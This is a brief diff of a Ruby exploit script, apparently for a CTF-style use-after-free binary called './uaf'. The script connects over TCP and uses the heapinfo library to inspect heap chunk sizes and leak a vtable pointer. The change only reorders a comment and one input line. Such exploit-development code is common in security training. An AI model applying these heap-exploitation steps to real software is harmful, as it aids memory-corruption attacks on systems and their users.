@@ -6,10 +6,10 @@ $HOST, $PORT = '', 12345
 $local=false
 ($HOST = '0'; $local=true) if ARGV.empty?
 z=TCPSocket.new $HOST, $PORT
-#============================exploit start!================================
-
-z.puts 1 # new Benz
 h = heapinfo('./uaf')
+#============================exploit start!================================
+z.puts 1 # new Benz
+
 h.debug {
   puts "sizeof(Car) = %#x" % h.dump(:heap, 0x10).to_chunk.real_size # get size of a car
   vtable1 = h.dump(:heap, 0x10, 8).unpack("Q*")[0]
